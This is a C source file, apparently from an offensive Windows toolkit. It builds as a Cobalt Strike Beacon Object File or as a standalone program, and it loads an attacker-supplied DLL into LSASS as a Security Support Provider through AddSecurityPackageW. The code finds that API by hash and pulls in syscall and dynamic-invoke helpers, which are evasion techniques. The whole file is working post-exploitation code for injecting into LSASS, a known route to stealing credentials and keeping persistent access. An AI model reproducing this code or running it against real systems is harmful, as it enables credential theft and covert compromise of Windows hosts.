#include "load_ssp.h"

#ifdef BOF
 #include "utils.c"
 #include "syscalls.c"
 #include "dinvoke.c"
#endif

VOID load_ssp(
    IN LPSTR ssp_path)
{
    AddSecurityPackageW_t AddSecurityPackageW;
    wchar_t ssp_path_w[MAX_PATH];

    if (!is_full_path(ssp_path))
    {
        PRINT_ERR("You must provide a full path: %s", ssp_path);
        return;
    }
    // find the address of AddSecurityPackageW dynamically
    AddSecurityPackageW = (AddSecurityPackageW_t)(ULONG_PTR)get_function_address(
        get_library_address(SSPICLI_DLL, TRUE),
        AddSecurityPackageW_SW2_HASH,
        0);
    if (!AddSecurityPackageW)
    {
        api_not_found("AddSecurityPackageW");
        return;
    }
    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
    DPRINT("Loading %s into " LSASS, ssp_path);
    SECURITY_PACKAGE_OPTIONS spo = {0};
    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
    }
    else
    {
        PRINT("Done, status: 0x%lx\n", status);
    }
    return;
}

#ifdef BOF

void go(char* args, int length)
{
    datap  parser;
    LPSTR ssp_path;

    BeaconDataParse(&parser, args, length);
    ssp_path = BeaconDataExtract(&parser, NULL);

    load_ssp(ssp_path);
}

#else

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("usage: %s <SSP path>\n", argv[0]);
        return -1;
    }

    load_ssp(argv[1]);
    return 0;
}

#endif
